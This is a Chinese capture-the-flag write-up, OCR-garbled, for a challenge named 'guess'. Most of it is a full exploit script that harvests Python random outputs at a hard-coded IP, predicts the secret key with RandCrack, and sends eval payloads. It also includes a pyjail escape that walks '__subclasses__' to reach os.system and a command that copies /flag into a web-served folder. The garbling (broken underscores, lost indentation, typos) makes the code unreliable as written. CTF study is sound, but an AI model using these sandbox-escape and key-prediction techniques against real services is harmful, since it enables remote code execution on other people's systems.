---
tags: [Python随机数预测, RandCrack, PyJail, RCE, 源码审计]
---

# guess

```
rd  =  random .Random()
```

random只被实例化了一次， 说明会共享seed， 可以爆破出种子然后是一个经典的pyjail

```
if  payload :
eval(payload ,  { '一builtin一 ' :{ B)
```

用类似

```
[  x .一init一 .一globals一  for  x  in  ' ' .一class一 .一base一 .一subclasses一 ()  i f  x .一name一= "_wrap_close"][0 ] ["system"]("cmd")  即可绕过
```

脚本

```
import  requests
import  re
import  uuid
from  randcrack  import  RandCrack
import  sys
import  time

URL  =  "<http:Ⅱ49.232.42.74 :30935>"

s  =  requests .Session()
rc  =  RandCrack()

def  get_rand_from_register() :
data  =  { "username " :  str(uuid .uuid4()) ,  "password " :  str(uuid .uuid4())}
try :
r  =  s .post(f "{URL}/register " ,  json=data ,  timeout=5 )
r .raise_for_status()
user_id  =  r .json () .get("user_id")
if  user_id :
return  int(user_id)

except  requests .exceptions .RequestException  as  e :
print(f "[-]  注出错 :  {e}")
return  None

def  get_rand_from_api() :
try :
r  =  s .post(f "{URL}/api " ,  json={"key " :  "1 "} ,  timeout=5 ) if  r .status_code  =  403 :
message  =  r .json () .get( "message " ,  "")
match  =  re .search(r 'Not  Allowed : (\\d+) ' ,  message) if  match :
key2  =  match .group(1 )
return  int(key2)
except  requests .exceptions .RequestException  as  e :
print(f "[-]  调用  /api  出错 :  {e}") return  Non
def  main() :
try :
requests .get(URL ,  timeout=5 )
except  requests .exceptions .RequestException :
print(f "[-]  无法连接到目标  {URL}。 ")
sys .exit(1 )

for  i  in  range(312) :
time .sleep(0 .1 )
print(f "[* ]  一  正在收集第  {i+1}/312  对随机数  一 ") rand1  =  get_rand_from_register()
if  rand1  is  not  None :  rc .submit(rand1)
else :  sys .exit("[-]  获取随机数失败 ， 中止。 ")

rand2  =  get_rand_from_api()
if  rand2  is  not  None :  rc .submit(rand2)
else :  sys .exit("[-]  获取随机数失败 ， 中止。 ")

while  True :
predicted_key  =  rc .predict_getrandbits(32)
print(f "[ ! ]  密钥预测成功 :  {predicted_key}")
try :
payload  =  input("payload  >  ")
if  payload .lower()  in  [ 'exit ' ] :
break
if  payload  =  "new " :
predicted_key  =  rc .predict_getrandbits(32) print(f "[ ! ]  密钥预测成功 :  {predicted_key}")
continue

exploit_data  =  {"key " :  str(predicted_key) ,  "payload " :  payload} response  =  s .post(f "{URL}/api " ,  json=exploit_data)
print(response .text [ :800])

except  Exception  as  e :
print(f "[-]  错误 :  {e}")

if      name      =  "    main    " :
一        一         一        一
main()
```

等待收集随机数完成后输入

```
[  x .一init一 .一globals一  for  x  in  ' ' .一class一 .一base一 .一subclasses一 ()  if x .一name一= "_wrap_close"][0 ] ["system"]("cat  /flag  >  /app/static/1 ")]
```

然后访问 /static/1  获取flag